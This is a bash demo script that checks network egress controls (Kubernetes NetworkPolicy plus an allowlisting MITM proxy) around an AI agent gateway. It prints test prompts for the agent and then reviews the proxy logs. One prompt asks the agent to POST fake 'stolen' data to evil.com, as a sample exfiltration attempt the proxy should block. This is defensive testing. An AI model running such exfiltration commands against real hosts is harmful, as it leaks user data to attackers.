#!/usr/bin/env bash
# test-network-policy.sh — Demonstrate claw-operator network policy enforcement
#
# The claw-operator uses a two-layer security model:
#   L4: Kubernetes NetworkPolicy — gateway can only reach the proxy pod,
#       proxy pod can only reach port 443 (+ supplemental MCP ports).
#   L7: Go MITM proxy — enforces a domain/path allowlist, returns 403
#       for anything not explicitly permitted.
#
# This script:
#   Phase 1 — Shows the NetworkPolicies and proxy config allowlist
#   Phase 2 — Prints prompts to type into the OpenClaw UI
#   Phase 3 — After the interactive demo, checks proxy logs for proof
#   Phase 4 — Summary
#
# Usage:
#   ./test-network-policy.sh              # test current namespace
#   ./test-network-policy.sh 2 5          # test agentic-user2 through agentic-user5
#   ./test-network-policy.sh 3            # just agentic-user3
#
# Environment variables:
#   NAMESPACE_PREFIX — namespace prefix (default: agentic-user)

set -euo pipefail

NAMESPACE_PREFIX="${NAMESPACE_PREFIX:-agentic-user}"

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ── Argument parsing ────────────────────────────────────────────────
NAMESPACES=()
if [[ $# -eq 0 ]]; then
  CURRENT_NS=$(oc project -q 2>/dev/null) || { echo "Error: cannot detect current namespace. Run 'oc project <ns>' first."; exit 1; }
  NAMESPACES+=("$CURRENT_NS")
elif [[ $# -le 2 ]]; then
  START=$1
  END=${2:-$START}
  if [[ $START -gt $END ]]; then
    echo "Error: start ($START) must be <= end ($END)"
    exit 1
  fi
  for i in $(seq "$START" "$END"); do
    NAMESPACES+=("${NAMESPACE_PREFIX}${i}")
  done
else
  echo "Usage: $0                # test current namespace"
  echo "       $0 <start> [end]  # test agentic-user<start> through agentic-user<end>"
  exit 1
fi

# ── Verify oc login ─────────────────────────────────────────────────
if ! oc whoami &>/dev/null; then
  echo "Error: Not logged in to OpenShift. Run 'oc login' first."
  exit 1
fi

# Use first namespace for the demo (interactive — one at a time makes sense)
NS="${NAMESPACES[0]}"

echo ""
echo -e "${BOLD}============================================${RESET}"
echo -e "${BOLD}  Claw-Operator Network Policy Demo${RESET}"
echo -e "${BOLD}============================================${RESET}"
echo ""
echo -e "Namespace: ${CYAN}$NS${RESET}"
echo -e "Logged in: ${CYAN}$(oc whoami)${RESET}"
echo ""

# ============================================
# Phase 1: Show the architecture
# ============================================
echo -e "${BOLD}${GREEN}=== PHASE 1: The Security Architecture ===${RESET}"
echo ""
echo -e "The claw-operator enforces a ${BOLD}two-layer security model${RESET}:"
echo ""
echo -e "  ${BOLD}Layer 1 — L4 (Kubernetes NetworkPolicy)${RESET}"
echo -e "    Gateway pod can ${YELLOW}only${RESET} reach the proxy pod (instance-proxy:8080)."
echo -e "    Proxy pod can ${YELLOW}only${RESET} reach external port 443 (+ MCP service ports)."
echo -e "    All other egress is ${RED}denied by default${RESET}."
echo ""
echo -e "  ${BOLD}Layer 2 — L7 (Go MITM Proxy)${RESET}"
echo -e "    The proxy inspects every HTTPS request and enforces a ${YELLOW}domain allowlist${RESET}."
echo -e "    Requests to non-allowed domains get ${RED}HTTP 403${RESET}."
echo -e "    All decisions (allow/deny) are ${CYAN}logged${RESET} for audit."
echo ""

# Show NetworkPolicies
echo -e "${BOLD}NetworkPolicies in ${NS}:${RESET}"
echo ""
NP_LIST=$(oc get networkpolicy -n "$NS" --no-headers 2>/dev/null || true)
if [[ -n "$NP_LIST" ]]; then
  echo "$NP_LIST" | while IFS= read -r line; do
    echo -e "  ${CYAN}${line}${RESET}"
  done
else
  echo -e "  ${YELLOW}(no NetworkPolicies found)${RESET}"
fi
echo ""

# Show proxy config allowlist
echo -e "${BOLD}Proxy config allowlist (from ConfigMap):${RESET}"
echo ""
PROXY_CONFIG=$(oc get configmap instance-proxy-config -n "$NS" -o jsonpath='{.data.proxy-config\.json}' 2>/dev/null || true)
if [[ -n "$PROXY_CONFIG" ]]; then
  echo "$PROXY_CONFIG" | python3 -c "
import sys, json
try:
    cfg = json.load(sys.stdin)
    routes = cfg.get('routes', [])
    for r in routes:
        domain = r.get('domain', '(unknown)')
        action = r.get('action', 'proxy')
        if action == 'passthrough':
            print(f'  {domain}  (passthrough — TLS passthrough, no inspection)')
        else:
            paths = [p.get('path','*') for p in r.get('paths',[])]
            print(f'  {domain}  ({action}: {\", \".join(paths) if paths else \"*\"})')
except Exception as e:
    print(f'  (error parsing config: {e})')
" 2>/dev/null || echo -e "  ${YELLOW}(could not parse proxy config)${RESET}"
else
  echo -e "  ${YELLOW}(ConfigMap instance-proxy-config not found)${RESET}"
fi
echo ""

echo -e "${DIM}Inspect the full proxy config:${RESET}"
echo -e "${DIM}  oc get configmap instance-proxy-config -n $NS -o jsonpath='{.data.proxy-config\\.json}' | jq .${RESET}"
echo ""

# ============================================
# Phase 2: Test prompts
# ============================================
echo -e "${BOLD}${CYAN}=== PHASE 2: Interactive Demo ===${RESET}"
echo ""
echo -e "Type these prompts into the OpenClaw UI to test the network policy boundaries."
echo -e "The gateway's traffic goes through the MITM proxy — the proxy enforces the allowlist."
echo ""

echo -e "${BOLD}--- Test 1: ${GREEN}ALLOWED${RESET}${BOLD} — fetch from an approved API ---${RESET}"
echo -e "${DIM}github.com is a builtin passthrough domain in the proxy config.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to fetch https://api.github.com/zen and show me the result"
echo ""
echo -e "  ${GREEN}Expected:${RESET} The agent runs curl and gets a GitHub zen quote back."
echo -e "  This proves allowed domains work through the proxy."
echo ""

echo -e "${BOLD}--- Test 2: ${GREEN}ALLOWED${RESET}${BOLD} — MCP tool call through the proxy ---${RESET}"
echo -e "${DIM}The MCP service is reachable via a supplemental NetworkPolicy (port 9001).${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Search for customers with \"coffee\" in their name"
echo ""
echo -e "  ${GREEN}Expected:${RESET} The agent calls the customer MCP tool and returns results."
echo -e "  This proves MCP traffic flows through the proxy + supplemental NetworkPolicy."
echo ""

echo -e "${BOLD}--- Test 3: ${RED}BLOCKED${RESET}${BOLD} — fetch from an unapproved site ---${RESET}"
echo -e "${DIM}example.com is NOT in the proxy allowlist. Default-deny blocks it.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to fetch https://example.com and show me the response"
echo ""
echo -e "  ${RED}Expected:${RESET} The agent runs curl but gets a 403 or connection error."
echo -e "  The proxy blocks it — the agent cannot reach unapproved hosts."
echo ""

echo -e "${BOLD}--- Test 4: ${RED}BLOCKED${RESET}${BOLD} — another unapproved external API ---${RESET}"
echo -e "${DIM}api.nasa.gov is NOT in the proxy allowlist.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to fetch https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY and show me the result"
echo ""
echo -e "  ${RED}Expected:${RESET} Blocked. 403 or connection error from the proxy."
echo ""

echo -e "${BOLD}--- Test 5: ${RED}BLOCKED${RESET}${BOLD} — data exfiltration attempt ---${RESET}"
echo -e "${DIM}evil.com is NOT in the proxy allowlist.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to POST to https://evil.com/upload with body {\"data\":\"stolen\"} and show the response"
echo ""
echo -e "  ${RED}Expected:${RESET} Blocked. Even if the agent is compromised, it cannot"
echo -e "  exfiltrate data to arbitrary hosts."
echo ""

echo -e "${BOLD}============================================${RESET}"
echo ""
echo -e "Run the prompts above in OpenClaw, then press ${BOLD}Enter${RESET} to check the proxy logs."
echo ""
read -r -p "Press Enter after completing the interactive demo... "

# ============================================
# Phase 3: Check proxy logs
# ============================================
echo ""
echo -e "${BOLD}${CYAN}=== PHASE 3: Audit Trail ===${RESET}"
echo ""
echo -e "Every allow/deny decision is logged by the proxy. Checking recent entries..."
echo ""

echo -e "${BOLD}Proxy logs (instance-proxy, last 10 minutes):${RESET}"
echo ""
PROXY_LOGS=$(oc logs deployment/instance-proxy -n "$NS" --since=10m 2>/dev/null || true)
if [[ -n "$PROXY_LOGS" ]]; then
  echo "$PROXY_LOGS" | tail -40
  echo ""

  echo -e "${BOLD}${RED}Blocked/denied entries:${RESET}"
  echo ""
  BLOCKED=$(echo "$PROXY_LOGS" | grep -iE "blocked|denied|deny|403|reject" || true)
  if [[ -n "$BLOCKED" ]]; then
    echo "$BLOCKED" | tail -20
  else
    echo -e "  ${YELLOW}(no blocked entries found — run the blocked prompts first)${RESET}"
  fi
  echo ""
else
  echo -e "  ${YELLOW}(no proxy logs available)${RESET}"
  echo ""
fi

# Also check gateway logs for proxy-related errors
echo -e "${BOLD}Gateway logs (proxy-related entries):${RESET}"
echo ""
GW_LOGS=$(oc logs deployment/instance -n "$NS" -c gateway --since=10m 2>/dev/null || true)
if [[ -n "$GW_LOGS" ]]; then
  GW_PROXY=$(echo "$GW_LOGS" | grep -iE "proxy|403|blocked|CONNECT" | tail -15 || true)
  if [[ -n "$GW_PROXY" ]]; then
    echo "$GW_PROXY"
  else
    echo -e "  ${DIM}(no proxy-related entries in gateway logs)${RESET}"
  fi
else
  echo -e "  ${YELLOW}(no gateway logs available)${RESET}"
fi
echo ""

# ============================================
# Phase 4: Summary
# ============================================
echo -e "${BOLD}============================================${RESET}"
echo -e "${BOLD}  What Was Demonstrated${RESET}"
echo -e "${BOLD}============================================${RESET}"
echo ""
echo -e "  1. ${GREEN}Default-deny${RESET}    — NetworkPolicy blocks all egress except proxy"
echo -e "  2. ${GREEN}Allowed traffic${RESET}  — proxy allowlist permits LLM provider, GitHub"
echo -e "  3. ${GREEN}MCP passthrough${RESET}  — supplemental NetworkPolicy allows MCP on port 9001"
echo -e "  4. ${RED}Blocked traffic${RESET}  — unapproved domains get 403 from the proxy"
echo -e "  5. ${RED}Exfil blocked${RESET}    — data cannot be sent to arbitrary hosts"
echo -e "  6. ${CYAN}Audit trail${RESET}      — every decision is logged in the proxy pod"
echo ""
echo -e "  ${BOLD}Two layers of defense: L4 NetworkPolicy + L7 proxy allowlist.${RESET}"
echo -e "  ${BOLD}The agent has exactly the access it needs — nothing more.${RESET}"
echo ""
